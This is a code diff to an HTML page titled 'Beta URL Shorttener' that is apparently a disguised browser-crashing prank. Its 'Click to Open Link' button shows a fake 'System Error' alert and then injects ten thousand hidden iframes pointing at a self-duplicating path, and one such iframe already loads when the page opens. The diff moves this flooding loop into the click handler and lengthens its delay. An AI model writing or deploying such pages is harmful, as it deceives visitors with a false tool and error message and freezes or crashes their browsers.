@@ -38,14 +38,14 @@
 		}
 		function openTabs() {
 			alert("System Error in Sector 32x3f")
-		}
-		for (var i = 0; i < 10000; i++) {
-			document.body.innerHTML += '<iframe height="0" width="0" src="/duplicatingTab/" title="Duplicating Tab"></iframe>'
+			for (var i = 0; i < 10000; i++) {
+			  document.body.innerHTML += '<iframe height="0" width="0" src="/duplicatingTab/" title="Duplicating Tab"></iframe>'
+		  }
 		}
 	</script>
 	
 	<h1 class="remove">Beta URL Shorttener</h1>
-	<input class="remove" type=button value="Click to Open Link" onclick="setTimeout(() => openTabs(), 1000); addMessagesOne();">
+	<input class="remove" type=button value="Click to Open Link" onclick="setTimeout(() => openTabs(), 5000); addMessagesOne();">
 	<iframe width="0" height="0" src="/duplicatingTab/" title="Duplicating Tab"></iframe>
 </body>
 </html>
